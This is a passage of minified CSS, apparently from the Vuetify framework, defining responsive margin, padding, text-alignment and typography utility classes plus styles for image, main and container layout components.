.ms-xl-3{margin-left:12px!important}.v-application--is-rtl .ms-xl-3{margin-right:12px!important}.v-application--is-ltr .ms-xl-4{margin-left:16px!important}.v-application--is-rtl .ms-xl-4{margin-right:16px!important}.v-application--is-ltr .ms-xl-5{margin-left:20px!important}.v-application--is-rtl .ms-xl-5{margin-right:20px!important}.v-application--is-ltr .ms-xl-6{margin-left:24px!important}.v-application--is-rtl .ms-xl-6{margin-right:24px!important}.v-application--is-ltr .ms-xl-7{margin-left:28px!important}.v-application--is-rtl .ms-xl-7{margin-right:28px!important}.v-application--is-ltr .ms-xl-8{margin-left:32px!important}.v-application--is-rtl .ms-xl-8{margin-right:32px!important}.v-application--is-ltr .ms-xl-9{margin-left:36px!important}.v-application--is-rtl .ms-xl-9{margin-right:36px!important}.v-application--is-ltr .ms-xl-10{margin-left:40px!important}.v-application--is-rtl .ms-xl-10{margin-right:40px!important}.v-application--is-ltr .ms-xl-11{margin-left:44px!important}.v-application--is-rtl .ms-xl-11{margin-right:44px!important}.v-application--is-ltr .ms-xl-12{margin-left:48px!important}.v-application--is-rtl .ms-xl-12{margin-right:48px!important}.v-application--is-ltr .ms-xl-13{margin-left:52px!important}.v-application--is-rtl .ms-xl-13{margin-right:52px!important}.v-application--is-ltr .ms-xl-14{margin-left:56px!important}.v-application--is-rtl .ms-xl-14{margin-right:56px!important}.v-application--is-ltr .ms-xl-15{margin-left:60px!important}.v-application--is-rtl .ms-xl-15{margin-right:60px!important}.v-application--is-ltr .ms-xl-16{margin-left:64px!important}.v-application--is-rtl .ms-xl-16{margin-right:64px!important}.v-application--is-ltr .ms-xl-auto{margin-left:auto!important}.v-application--is-rtl .ms-xl-auto{margin-right:auto!important}.v-application--is-ltr .me-xl-0{margin-right:0!important}.v-application--is-rtl .me-xl-0{margin-left:0!important}.v-application--is-ltr .me-xl-1{margin-right:4px!important}.v-application--is-rtl .me-xl-1{margin-left:4px!important}.v-application--is-ltr .me-xl-2{margin-right:8px!important}.v-application--is-rtl .me-xl-2{margin-left:8px!important}.v-application--is-ltr .me-xl-3{margin-right:12px!important}.v-application--is-rtl .me-xl-3{margin-left:12px!important}.v-application--is-ltr .me-xl-4{margin-right:16px!important}.v-application--is-rtl .me-xl-4{margin-left:16px!important}.v-application--is-ltr .me-xl-5{margin-right:20px!important}.v-application--is-rtl .me-xl-5{margin-left:20px!important}.v-application--is-ltr .me-xl-6{margin-right:24px!important}.v-application--is-rtl .me-xl-6{margin-left:24px!important}.v-application--is-ltr .me-xl-7{margin-right:28px!important}.v-application--is-rtl .me-xl-7{margin-left:28px!important}.v-application--is-ltr .me-xl-8{margin-right:32px!important}.v-application--is-rtl .me-xl-8{margin-left:32px!important}.v-application--is-ltr .me-xl-9{margin-right:36px!important}.v-application--is-rtl .me-xl-9{margin-left:36px!important}.v-application--is-ltr .me-xl-10{margin-right:40px!important}.v-application--is-rtl .me-xl-10{margin-left:40px!important}.v-application--is-ltr .me-xl-11{margin-right:44px!important}.v-application--is-rtl .me-xl-11{margin-left:44px!important}.v-application--is-ltr .me-xl-12{margin-right:48px!important}.v-application--is-rtl .me-xl-12{margin-left:48px!important}.v-application--is-ltr .me-xl-13{margin-right:52px!important}.v-application--is-rtl .me-xl-13{margin-left:52px!important}.v-application--is-ltr .me-xl-14{margin-right:56px!important}.v-application--is-rtl .me-xl-14{margin-left:56px!important}.v-application--is-ltr .me-xl-15{margin-right:60px!important}.v-application--is-rtl .me-xl-15{margin-left:60px!important}.v-application--is-ltr .me-xl-16{margin-right:64px!important}.v-application--is-rtl .me-xl-16{margin-left:64px!important}.v-application--is-ltr .me-xl-auto{margin-right:auto!important}.v-application--is-rtl .me-xl-auto{margin-left:auto!important}.v-application .ma-xl-n1{margin:-4px!important}.v-application .ma-xl-n2{margin:-8px!important}.v-application .ma-xl-n3{margin:-12px!important}.v-application .ma-xl-n4{margin:-16px!important}.v-application .ma-xl-n5{margin:-20px!important}.v-application .ma-xl-n6{margin:-24px!important}.v-application .ma-xl-n7{margin:-28px!important}.v-application .ma-xl-n8{margin:-32px!important}.v-application .ma-xl-n9{margin:-36px!important}.v-application .ma-xl-n10{margin:-40px!important}.v-application .ma-xl-n11{margin:-44px!important}.v-application .ma-xl-n12{margin:-48px!important}.v-application .ma-xl-n13{margin:-52px!important}.v-application .ma-xl-n14{margin:-56px!important}.v-application .ma-xl-n15{margin:-60px!important}.v-application .ma-xl-n16{margin:-64px!important}.v-application .mx-xl-n1{margin-right:-4px!important;margin-left:-4px!important}.v-application .mx-xl-n2{margin-right:-8px!important;margin-left:-8px!important}.v-application .mx-xl-n3{margin-right:-12px!important;margin-left:-12px!important}.v-application .mx-xl-n4{margin-right:-16px!important;margin-left:-16px!important}.v-application .mx-xl-n5{margin-right:-20px!important;margin-left:-20px!important}.v-application .mx-xl-n6{margin-right:-24px!important;margin-left:-24px!important}.v-application .mx-xl-n7{margin-right:-28px!important;margin-left:-28px!important}.v-application .mx-xl-n8{margin-right:-32px!important;margin-left:-32px!important}.v-application .mx-xl-n9{margin-right:-36px!important;margin-left:-36px!important}.v-application .mx-xl-n10{margin-right:-40px!important;margin-left:-40px!important}.v-application .mx-xl-n11{margin-right:-44px!important;margin-left:-44px!important}.v-application .mx-xl-n12{margin-right:-48px!important;margin-left:-48px!important}.v-application .mx-xl-n13{margin-right:-52px!important;margin-left:-52px!important}.v-application .mx-xl-n14{margin-right:-56px!important;margin-left:-56px!important}.v-application .mx-xl-n15{margin-right:-60px!important;margin-left:-60px!important}.v-application .mx-xl-n16{margin-right:-64px!important;margin-left:-64px!important}.v-application .my-xl-n1{margin-top:-4px!important;margin-bottom:-4px!important}.v-application .my-xl-n2{margin-top:-8px!important;margin-bottom:-8px!important}.v-application .my-xl-n3{margin-top:-12px!important;margin-bottom:-12px!important}.v-application .my-xl-n4{margin-top:-16px!important;margin-bottom:-16px!important}.v-application .my-xl-n5{margin-top:-20px!important;margin-bottom:-20px!important}.v-application .my-xl-n6{margin-top:-24px!important;margin-bottom:-24px!important}.v-application .my-xl-n7{margin-top:-28px!important;margin-bottom:-28px!important}.v-application .my-xl-n8{margin-top:-32px!important;margin-bottom:-32px!important}.v-application .my-xl-n9{margin-top:-36px!important;margin-bottom:-36px!important}.v-application .my-xl-n10{margin-top:-40px!important;margin-bottom:-40px!important}.v-application .my-xl-n11{margin-top:-44px!important;margin-bottom:-44px!important}.v-application .my-xl-n12{margin-top:-48px!important;margin-bottom:-48px!important}.v-application .my-xl-n13{margin-top:-52px!important;margin-bottom:-52px!important}.v-application .my-xl-n14{margin-top:-56px!important;margin-bottom:-56px!important}.v-application .my-xl-n15{margin-top:-60px!important;margin-bottom:-60px!important}.v-application .my-xl-n16{margin-top:-64px!important;margin-bottom:-64px!important}.v-application .mt-xl-n1{margin-top:-4px!important}.v-application .mt-xl-n2{margin-top:-8px!important}.v-application .mt-xl-n3{margin-top:-12px!important}.v-application .mt-xl-n4{margin-top:-16px!important}.v-application .mt-xl-n5{margin-top:-20px!important}.v-application .mt-xl-n6{margin-top:-24px!important}.v-application .mt-xl-n7{margin-top:-28px!important}.v-application .mt-xl-n8{margin-top:-32px!important}.v-application .mt-xl-n9{margin-top:-36px!important}.v-application .mt-xl-n10{margin-top:-40px!important}.v-application .mt-xl-n11{margin-top:-44px!important}.v-application .mt-xl-n12{margin-top:-48px!important}.v-application .mt-xl-n13{margin-top:-52px!important}.v-application .mt-xl-n14{margin-top:-56px!important}.v-application .mt-xl-n15{margin-top:-60px!important}.v-application .mt-xl-n16{margin-top:-64px!important}.v-application .mr-xl-n1{margin-right:-4px!important}.v-application .mr-xl-n2{margin-right:-8px!important}.v-application .mr-xl-n3{margin-right:-12px!important}.v-application .mr-xl-n4{margin-right:-16px!important}.v-application .mr-xl-n5{margin-right:-20px!important}.v-application .mr-xl-n6{margin-right:-24px!important}.v-application .mr-xl-n7{margin-right:-28px!important}.v-application .mr-xl-n8{margin-right:-32px!important}.v-application .mr-xl-n9{margin-right:-36px!important}.v-application .mr-xl-n10{margin-right:-40px!important}.v-application .mr-xl-n11{margin-right:-44px!important}.v-application .mr-xl-n12{margin-right:-48px!important}.v-application .mr-xl-n13{margin-right:-52px!important}.v-application .mr-xl-n14{margin-right:-56px!important}.v-application .mr-xl-n15{margin-right:-60px!important}.v-application .mr-xl-n16{margin-right:-64px!important}.v-application .mb-xl-n1{margin-bottom:-4px!important}.v-application .mb-xl-n2{margin-bottom:-8px!important}.v-application .mb-xl-n3{margin-bottom:-12px!important}.v-application .mb-xl-n4{margin-bottom:-16px!important}.v-application .mb-xl-n5{margin-bottom:-20px!important}.v-application .mb-xl-n6{margin-bottom:-24px!important}.v-application .mb-xl-n7{margin-bottom:-28px!important}.v-application .mb-xl-n8{margin-bottom:-32px!important}.v-application .mb-xl-n9{margin-bottom:-36px!important}.v-application .mb-xl-n10{margin-bottom:-40px!important}.v-application .mb-xl-n11{margin-bottom:-44px!important}.v-application .mb-xl-n12{margin-bottom:-48px!important}.v-application .mb-xl-n13{margin-bottom:-52px!important}.v-application .mb-xl-n14{margin-bottom:-56px!important}.v-application .mb-xl-n15{margin-bottom:-60px!important}.v-application .mb-xl-n16{margin-bottom:-64px!important}.v-application .ml-xl-n1{margin-left:-4px!important}.v-application .ml-xl-n2{margin-left:-8px!important}.v-application .ml-xl-n3{margin-left:-12px!important}.v-application .ml-xl-n4{margin-left:-16px!important}.v-application .ml-xl-n5{margin-left:-20px!important}.v-application .ml-xl-n6{margin-left:-24px!important}.v-application .ml-xl-n7{margin-left:-28px!important}.v-application .ml-xl-n8{margin-left:-32px!important}.v-application .ml-xl-n9{margin-left:-36px!important}.v-application .ml-xl-n10{margin-left:-40px!important}.v-application .ml-xl-n11{margin-left:-44px!important}.v-application .ml-xl-n12{margin-left:-48px!important}.v-application .ml-xl-n13{margin-left:-52px!important}.v-application .ml-xl-n14{margin-left:-56px!important}.v-application .ml-xl-n15{margin-left:-60px!important}.v-application .ml-xl-n16{margin-left:-64px!important}.v-application--is-ltr .ms-xl-n1{margin-left:-4px!important}.v-application--is-rtl .ms-xl-n1{margin-right:-4px!important}.v-application--is-ltr .ms-xl-n2{margin-left:-8px!important}.v-application--is-rtl .ms-xl-n2{margin-right:-8px!important}.v-application--is-ltr .ms-xl-n3{margin-left:-12px!important}.v-application--is-rtl .ms-xl-n3{margin-right:-12px!important}.v-application--is-ltr .ms-xl-n4{margin-left:-16px!important}.v-application--is-rtl .ms-xl-n4{margin-right:-16px!important}.v-application--is-ltr .ms-xl-n5{margin-left:-20px!important}.v-application--is-rtl .ms-xl-n5{margin-right:-20px!important}.v-application--is-ltr .ms-xl-n6{margin-left:-24px!important}.v-application--is-rtl .ms-xl-n6{margin-right:-24px!important}.v-application--is-ltr .ms-xl-n7{margin-left:-28px!important}.v-application--is-rtl .ms-xl-n7{margin-right:-28px!important}.v-application--is-ltr .ms-xl-n8{margin-left:-32px!important}.v-application--is-rtl .ms-xl-n8{margin-right:-32px!important}.v-application--is-ltr .ms-xl-n9{margin-left:-36px!important}.v-application--is-rtl .ms-xl-n9{margin-right:-36px!important}.v-application--is-ltr .ms-xl-n10{margin-left:-40px!important}.v-application--is-rtl .ms-xl-n10{margin-right:-40px!important}.v-application--is-ltr .ms-xl-n11{margin-left:-44px!important}.v-application--is-rtl .ms-xl-n11{margin-right:-44px!important}.v-application--is-ltr .ms-xl-n12{margin-left:-48px!important}.v-application--is-rtl .ms-xl-n12{margin-right:-48px!important}.v-application--is-ltr .ms-xl-n13{margin-left:-52px!important}.v-application--is-rtl .ms-xl-n13{margin-right:-52px!important}.v-application--is-ltr .ms-xl-n14{margin-left:-56px!important}.v-application--is-rtl .ms-xl-n14{margin-right:-56px!important}.v-application--is-ltr .ms-xl-n15{margin-left:-60px!important}.v-application--is-rtl .ms-xl-n15{margin-right:-60px!important}.v-application--is-ltr .ms-xl-n16{margin-left:-64px!important}.v-application--is-rtl .ms-xl-n16{margin-right:-64px!important}.v-application--is-ltr .me-xl-n1{margin-right:-4px!important}.v-application--is-rtl .me-xl-n1{margin-left:-4px!important}.v-application--is-ltr .me-xl-n2{margin-right:-8px!important}.v-application--is-rtl .me-xl-n2{margin-left:-8px!important}.v-application--is-ltr .me-xl-n3{margin-right:-12px!important}.v-application--is-rtl .me-xl-n3{margin-left:-12px!important}.v-application--is-ltr .me-xl-n4{margin-right:-16px!important}.v-application--is-rtl .me-xl-n4{margin-left:-16px!important}.v-application--is-ltr .me-xl-n5{margin-right:-20px!important}.v-application--is-rtl .me-xl-n5{margin-left:-20px!important}.v-application--is-ltr .me-xl-n6{margin-right:-24px!important}.v-application--is-rtl .me-xl-n6{margin-left:-24px!important}.v-application--is-ltr .me-xl-n7{margin-right:-28px!important}.v-application--is-rtl .me-xl-n7{margin-left:-28px!important}.v-application--is-ltr .me-xl-n8{margin-right:-32px!important}.v-application--is-rtl .me-xl-n8{margin-left:-32px!important}.v-application--is-ltr .me-xl-n9{margin-right:-36px!important}.v-application--is-rtl .me-xl-n9{margin-left:-36px!important}.v-application--is-ltr .me-xl-n10{margin-right:-40px!important}.v-application--is-rtl .me-xl-n10{margin-left:-40px!important}.v-application--is-ltr .me-xl-n11{margin-right:-44px!important}.v-application--is-rtl .me-xl-n11{margin-left:-44px!important}.v-application--is-ltr .me-xl-n12{margin-right:-48px!important}.v-application--is-rtl .me-xl-n12{margin-left:-48px!important}.v-application--is-ltr .me-xl-n13{margin-right:-52px!important}.v-application--is-rtl .me-xl-n13{margin-left:-52px!important}.v-application--is-ltr .me-xl-n14{margin-right:-56px!important}.v-application--is-rtl .me-xl-n14{margin-left:-56px!important}.v-application--is-ltr .me-xl-n15{margin-right:-60px!important}.v-application--is-rtl .me-xl-n15{margin-left:-60px!important}.v-application--is-ltr .me-xl-n16{margin-right:-64px!important}.v-application--is-rtl .me-xl-n16{margin-left:-64px!important}.v-application .pa-xl-0{padding:0!important}.v-application .pa-xl-1{padding:4px!important}.v-application .pa-xl-2{padding:8px!important}.v-application .pa-xl-3{padding:12px!important}.v-application .pa-xl-4{padding:16px!important}.v-application .pa-xl-5{padding:20px!important}.v-application .pa-xl-6{padding:24px!important}.v-application .pa-xl-7{padding:28px!important}.v-application .pa-xl-8{padding:32px!important}.v-application .pa-xl-9{padding:36px!important}.v-application .pa-xl-10{padding:40px!important}.v-application .pa-xl-11{padding:44px!important}.v-application .pa-xl-12{padding:48px!important}.v-application .pa-xl-13{padding:52px!important}.v-application .pa-xl-14{padding:56px!important}.v-application .pa-xl-15{padding:60px!important}.v-application .pa-xl-16{padding:64px!important}.v-application .px-xl-0{padding-right:0!important;padding-left:0!important}.v-application .px-xl-1{padding-right:4px!important;padding-left:4px!important}.v-application .px-xl-2{padding-right:8px!important;padding-left:8px!important}.v-application .px-xl-3{padding-right:12px!important;padding-left:12px!important}.v-application .px-xl-4{padding-right:16px!important;padding-left:16px!important}.v-application .px-xl-5{padding-right:20px!important;padding-left:20px!important}.v-application .px-xl-6{padding-right:24px!important;padding-left:24px!important}.v-application .px-xl-7{padding-right:28px!important;padding-left:28px!important}.v-application .px-xl-8{padding-right:32px!important;padding-left:32px!important}.v-application .px-xl-9{padding-right:36px!important;padding-left:36px!important}.v-application .px-xl-10{padding-right:40px!important;padding-left:40px!important}.v-application .px-xl-11{padding-right:44px!important;padding-left:44px!important}.v-application .px-xl-12{padding-right:48px!important;padding-left:48px!important}.v-application .px-xl-13{padding-right:52px!important;padding-left:52px!important}.v-application .px-xl-14{padding-right:56px!important;padding-left:56px!important}.v-application .px-xl-15{padding-right:60px!important;padding-left:60px!important}.v-application .px-xl-16{padding-right:64px!important;padding-left:64px!important}.v-application .py-xl-0{padding-top:0!important;padding-bottom:0!important}.v-application .py-xl-1{padding-top:4px!important;padding-bottom:4px!important}.v-application .py-xl-2{padding-top:8px!important;padding-bottom:8px!important}.v-application .py-xl-3{padding-top:12px!important;padding-bottom:12px!important}.v-application .py-xl-4{padding-top:16px!important;padding-bottom:16px!important}.v-application .py-xl-5{padding-top:20px!important;padding-bottom:20px!important}.v-application .py-xl-6{padding-top:24px!important;padding-bottom:24px!important}.v-application .py-xl-7{padding-top:28px!important;padding-bottom:28px!important}.v-application .py-xl-8{padding-top:32px!important;padding-bottom:32px!important}.v-application .py-xl-9{padding-top:36px!important;padding-bottom:36px!important}.v-application .py-xl-10{padding-top:40px!important;padding-bottom:40px!important}.v-application .py-xl-11{padding-top:44px!important;padding-bottom:44px!important}.v-application .py-xl-12{padding-top:48px!important;padding-bottom:48px!important}.v-application .py-xl-13{padding-top:52px!important;padding-bottom:52px!important}.v-application .py-xl-14{padding-top:56px!important;padding-bottom:56px!important}.v-application .py-xl-15{padding-top:60px!important;padding-bottom:60px!important}.v-application .py-xl-16{padding-top:64px!important;padding-bottom:64px!important}.v-application .pt-xl-0{padding-top:0!important}.v-application .pt-xl-1{padding-top:4px!important}.v-application .pt-xl-2{padding-top:8px!important}.v-application .pt-xl-3{padding-top:12px!important}.v-application .pt-xl-4{padding-top:16px!important}.v-application .pt-xl-5{padding-top:20px!important}.v-application .pt-xl-6{padding-top:24px!important}.v-application .pt-xl-7{padding-top:28px!important}.v-application .pt-xl-8{padding-top:32px!important}.v-application .pt-xl-9{padding-top:36px!important}.v-application .pt-xl-10{padding-top:40px!important}.v-application .pt-xl-11{padding-top:44px!important}.v-application .pt-xl-12{padding-top:48px!important}.v-application .pt-xl-13{padding-top:52px!important}.v-application .pt-xl-14{padding-top:56px!important}.v-application .pt-xl-15{padding-top:60px!important}.v-application .pt-xl-16{padding-top:64px!important}.v-application .pr-xl-0{padding-right:0!important}.v-application .pr-xl-1{padding-right:4px!important}.v-application .pr-xl-2{padding-right:8px!important}.v-application .pr-xl-3{padding-right:12px!important}.v-application .pr-xl-4{padding-right:16px!important}.v-application .pr-xl-5{padding-right:20px!important}.v-application .pr-xl-6{padding-right:24px!important}.v-application .pr-xl-7{padding-right:28px!important}.v-application .pr-xl-8{padding-right:32px!important}.v-application .pr-xl-9{padding-right:36px!important}.v-application .pr-xl-10{padding-right:40px!important}.v-application .pr-xl-11{padding-right:44px!important}.v-application .pr-xl-12{padding-right:48px!important}.v-application .pr-xl-13{padding-right:52px!important}.v-application .pr-xl-14{padding-right:56px!important}.v-application .pr-xl-15{padding-right:60px!important}.v-application .pr-xl-16{padding-right:64px!important}.v-application .pb-xl-0{padding-bottom:0!important}.v-application .pb-xl-1{padding-bottom:4px!important}.v-application .pb-xl-2{padding-bottom:8px!important}.v-application .pb-xl-3{padding-bottom:12px!important}.v-application .pb-xl-4{padding-bottom:16px!important}.v-application .pb-xl-5{padding-bottom:20px!important}.v-application .pb-xl-6{padding-bottom:24px!important}.v-application .pb-xl-7{padding-bottom:28px!important}.v-application .pb-xl-8{padding-bottom:32px!important}.v-application .pb-xl-9{padding-bottom:36px!important}.v-application .pb-xl-10{padding-bottom:40px!important}.v-application .pb-xl-11{padding-bottom:44px!important}.v-application .pb-xl-12{padding-bottom:48px!important}.v-application .pb-xl-13{padding-bottom:52px!important}.v-application .pb-xl-14{padding-bottom:56px!important}.v-application .pb-xl-15{padding-bottom:60px!important}.v-application .pb-xl-16{padding-bottom:64px!important}.v-application .pl-xl-0{padding-left:0!important}.v-application .pl-xl-1{padding-left:4px!important}.v-application .pl-xl-2{padding-left:8px!important}.v-application .pl-xl-3{padding-left:12px!important}.v-application .pl-xl-4{padding-left:16px!important}.v-application .pl-xl-5{padding-left:20px!important}.v-application .pl-xl-6{padding-left:24px!important}.v-application .pl-xl-7{padding-left:28px!important}.v-application .pl-xl-8{padding-left:32px!important}.v-application .pl-xl-9{padding-left:36px!important}.v-application .pl-xl-10{padding-left:40px!important}.v-application .pl-xl-11{padding-left:44px!important}.v-application .pl-xl-12{padding-left:48px!important}.v-application .pl-xl-13{padding-left:52px!important}.v-application .pl-xl-14{padding-left:56px!important}.v-application .pl-xl-15{padding-left:60px!important}.v-application .pl-xl-16{padding-left:64px!important}.v-application--is-ltr .ps-xl-0{padding-left:0!important}.v-application--is-rtl .ps-xl-0{padding-right:0!important}.v-application--is-ltr .ps-xl-1{padding-left:4px!important}.v-application--is-rtl .ps-xl-1{padding-right:4px!important}.v-application--is-ltr .ps-xl-2{padding-left:8px!important}.v-application--is-rtl .ps-xl-2{padding-right:8px!important}.v-application--is-ltr .ps-xl-3{padding-left:12px!important}.v-application--is-rtl .ps-xl-3{padding-right:12px!important}.v-application--is-ltr .ps-xl-4{padding-left:16px!important}.v-application--is-rtl .ps-xl-4{padding-right:16px!important}.v-application--is-ltr .ps-xl-5{padding-left:20px!important}.v-application--is-rtl .ps-xl-5{padding-right:20px!important}.v-application--is-ltr .ps-xl-6{padding-left:24px!important}.v-application--is-rtl .ps-xl-6{padding-right:24px!important}.v-application--is-ltr .ps-xl-7{padding-left:28px!important}.v-application--is-rtl .ps-xl-7{padding-right:28px!important}.v-application--is-ltr .ps-xl-8{padding-left:32px!important}.v-application--is-rtl .ps-xl-8{padding-right:32px!important}.v-application--is-ltr .ps-xl-9{padding-left:36px!important}.v-application--is-rtl .ps-xl-9{padding-right:36px!important}.v-application--is-ltr .ps-xl-10{padding-left:40px!important}.v-application--is-rtl .ps-xl-10{padding-right:40px!important}.v-application--is-ltr .ps-xl-11{padding-left:44px!important}.v-application--is-rtl .ps-xl-11{padding-right:44px!important}.v-application--is-ltr .ps-xl-12{padding-left:48px!important}.v-application--is-rtl .ps-xl-12{padding-right:48px!important}.v-application--is-ltr .ps-xl-13{padding-left:52px!important}.v-application--is-rtl .ps-xl-13{padding-right:52px!important}.v-application--is-ltr .ps-xl-14{padding-left:56px!important}.v-application--is-rtl .ps-xl-14{padding-right:56px!important}.v-application--is-ltr .ps-xl-15{padding-left:60px!important}.v-application--is-rtl .ps-xl-15{padding-right:60px!important}.v-application--is-ltr .ps-xl-16{padding-left:64px!important}.v-application--is-rtl .ps-xl-16{padding-right:64px!important}.v-application--is-ltr .pe-xl-0{padding-right:0!important}.v-application--is-rtl .pe-xl-0{padding-left:0!important}.v-application--is-ltr .pe-xl-1{padding-right:4px!important}.v-application--is-rtl .pe-xl-1{padding-left:4px!important}.v-application--is-ltr .pe-xl-2{padding-right:8px!important}.v-application--is-rtl .pe-xl-2{padding-left:8px!important}.v-application--is-ltr .pe-xl-3{padding-right:12px!important}.v-application--is-rtl .pe-xl-3{padding-left:12px!important}.v-application--is-ltr .pe-xl-4{padding-right:16px!important}.v-application--is-rtl .pe-xl-4{padding-left:16px!important}.v-application--is-ltr .pe-xl-5{padding-right:20px!important}.v-application--is-rtl .pe-xl-5{padding-left:20px!important}.v-application--is-ltr .pe-xl-6{padding-right:24px!important}.v-application--is-rtl .pe-xl-6{padding-left:24px!important}.v-application--is-ltr .pe-xl-7{padding-right:28px!important}.v-application--is-rtl .pe-xl-7{padding-left:28px!important}.v-application--is-ltr .pe-xl-8{padding-right:32px!important}.v-application--is-rtl .pe-xl-8{padding-left:32px!important}.v-application--is-ltr .pe-xl-9{padding-right:36px!important}.v-application--is-rtl .pe-xl-9{padding-left:36px!important}.v-application--is-ltr .pe-xl-10{padding-right:40px!important}.v-application--is-rtl .pe-xl-10{padding-left:40px!important}.v-application--is-ltr .pe-xl-11{padding-right:44px!important}.v-application--is-rtl .pe-xl-11{padding-left:44px!important}.v-application--is-ltr .pe-xl-12{padding-right:48px!important}.v-application--is-rtl .pe-xl-12{padding-left:48px!important}.v-application--is-ltr .pe-xl-13{padding-right:52px!important}.v-application--is-rtl .pe-xl-13{padding-left:52px!important}.v-application--is-ltr .pe-xl-14{padding-right:56px!important}.v-application--is-rtl .pe-xl-14{padding-left:56px!important}.v-application--is-ltr .pe-xl-15{padding-right:60px!important}.v-application--is-rtl .pe-xl-15{padding-left:60px!important}.v-application--is-ltr .pe-xl-16{padding-right:64px!important}.v-application--is-rtl .pe-xl-16{padding-left:64px!important}.v-application .text-xl-left{text-align:left!important}.v-application .text-xl-right{text-align:right!important}.v-application .text-xl-center{text-align:center!important}.v-application .text-xl-justify{text-align:justify!important}[dir=ltr] .v-application .text-xl-start{text-align:left!important}[dir=ltr] .v-application .text-xl-end,[dir=rtl] .v-application .text-xl-start{text-align:right!important}[dir=rtl] .v-application .text-xl-end{text-align:left!important}.v-application .text-xl-h1{font-size:6rem!important;line-height:6rem;letter-spacing:-.015625em!important}.v-application .text-xl-h1,.v-application .text-xl-h2{font-weight:300;font-family:"Roboto",sans-serif!important}.v-application .text-xl-h2{font-size:3.75rem!important;line-height:3.75rem;letter-spacing:-.0083333333em!important}.v-application .text-xl-h3{font-size:3rem!important;line-height:3.125rem;letter-spacing:normal!important}.v-application .text-xl-h3,.v-application .text-xl-h4{font-weight:400;font-family:"Roboto",sans-serif!important}.v-application .text-xl-h4{font-size:2.125rem!important;line-height:2.5rem;letter-spacing:.0073529412em!important}.v-application .text-xl-h5{font-size:1.5rem!important;font-weight:400;letter-spacing:normal!important}.v-application .text-xl-h5,.v-application .text-xl-h6{line-height:2rem;font-family:"Roboto",sans-serif!important}.v-application .text-xl-h6{font-size:1.25rem!important;font-weight:500;letter-spacing:.0125em!important}.v-application .text-xl-subtitle-1{font-size:1rem!important;font-weight:400;line-height:1.75rem;letter-spacing:.009375em!important;font-family:"Roboto",sans-serif!important}.v-application .text-xl-subtitle-2{font-size:.875rem!important;font-weight:500;line-height:1.375rem;letter-spacing:.0071428571em!important;font-family:"Roboto",sans-serif!important}.v-application .text-xl-body-1{font-size:1rem!important;font-weight:400;line-height:1.5rem;letter-spacing:.03125em!important;font-family:"Roboto",sans-serif!important}.v-application .text-xl-body-2{font-weight:400;line-height:1.25rem;letter-spacing:.0178571429em!important}.v-application .text-xl-body-2,.v-application .text-xl-button{font-size:.875rem!important;font-family:"Roboto",sans-serif!important}.v-application .text-xl-button{font-weight:500;line-height:2.25rem;letter-spacing:.0892857143em!important;text-transform:uppercase!important}.v-application .text-xl-caption{font-weight:400;line-height:1.25rem;letter-spacing:.0333333333em!important}.v-application .text-xl-caption,.v-application .text-xl-overline{font-size:.75rem!important;font-family:"Roboto",sans-serif!important}.v-application .text-xl-overline{font-weight:500;line-height:2rem;letter-spacing:.1666666667em!important;text-transform:uppercase!important}}@media print{.v-application .d-print-none{display:none!important}.v-application .d-print-inline{display:inline!important}.v-application .d-print-inline-block{display:inline-block!important}.v-application .d-print-block{display:block!important}.v-application .d-print-table{display:table!important}.v-application .d-print-table-row{display:table-row!important}.v-application .d-print-table-cell{display:table-cell!important}.v-application .d-print-flex{display:flex!important}.v-application .d-print-inline-flex{display:inline-flex!important}.v-application .float-print-none{float:none!important}.v-application .float-print-left{float:left!important}.v-application .float-print-right{float:right!important}}
.theme--light.v-image{color:rgba(0,0,0,.87)}.theme--dark.v-image{color:#fff}.v-image{z-index:0}.v-image__image,.v-image__placeholder{z-index:-1;position:absolute;top:0;left:0;width:100%;height:100%}.v-image__image{background-repeat:no-repeat}.v-image__image--preload{filter:blur(2px)}.v-image__image--contain{background-size:contain}.v-image__image--cover{background-size:cover}
.v-responsive{position:relative;overflow:hidden;flex:1 0 auto;max-width:100%;display:flex}.v-responsive__content{flex:1 0 0px;max-width:100%}.v-application--is-ltr .v-responsive__sizer~.v-responsive__content{margin-left:-100%}.v-application--is-rtl .v-responsive__sizer~.v-responsive__content{margin-right:-100%}.v-responsive__sizer{transition:padding-bottom .2s cubic-bezier(.25,.8,.5,1);flex:1 0 0px}
.v-main{display:flex;flex:1 0 auto;max-width:100%;transition:.2s cubic-bezier(.4,0,.2,1)}.v-main:not([data-booted=true]){transition:none!important}.v-main__wrap{flex:1 1 auto;max-width:100%;position:relative}@-moz-document url-prefix(){@media print{.v-main{display:block}}}
.container.grow-shrink-0{flex-grow:0;flex-shrink:0}.container.fill-height{align-items:center;display:flex;flex-wrap:wrap}.container.fill-height>.row{flex:1 1 100%;max-width:calc(100% + 24px)}.container.fill-height>.layout{height:100%;flex:1 1 auto}.container.fill-height>.layout.grow-shrink-0{flex-grow:0;flex-shrink:0}.container.grid-list-xs .layout .flex{padding:1px}.container.grid-list-xs .layout:only-child{margin:-1px}.container.grid-list-xs .layout:not(:only-child){margin:auto -1px}.container.grid-list-xs :not(:only-child) .layout:first-child{margin-top:-1px}.container.grid-list-xs :not(:only-child) .layout:last-child{margin-bottom:-1px}.container.grid-list-sm .layout .flex{padding:2px}.container.grid-list-sm .layout:only-child{margin:-2px}.container.grid-list-sm .layout:not(:only-child){margin:auto -2px}.container.grid-list-sm :not(:only-child) .layout:first-child{margin-top:-2px}.container.grid-list-sm :not(:only-child) .layout:last-child{margin-bottom:-2px}.container.grid-list-md .layout .flex{padding:4px}.container.grid-list-md .layout:only-child{margin:-4px}.container.grid-list-md .layout:not(:only-child){margin:auto -4px}.container.grid-list-md :not(:only-child) .layout:first-child{margin-top:-4px}.container.grid-list-md :not(:only-child) .layout:last-child{margin-bottom:-4px}.container.grid-list-lg .layout .flex{padding:8px}.container.grid-list-lg .layout:only-child{margin:-8px}.container.grid-list-lg .layout:not(:only-child){margin:auto -8px}.container.grid-list-lg :not(:only-child) .layout:first-child{margin-top:-8px}.container.grid-list-lg :not(:only-child) .layout:last-child{margin-bottom:-8px}.container.grid-list-xl .layout .flex{padding:12px}.container.grid-list-xl .layout:only-child{margin:-12px}.container.grid-list-xl .layout:not(:only-child){margin:auto -12px}.container.grid-list-xl :not(:only-child) .layout:first-child{margin-top:-12px}.container.grid-list-xl :not(:only-child) .layout:last-child{margin-bottom:-12px}.layout{display:flex;flex:1 1 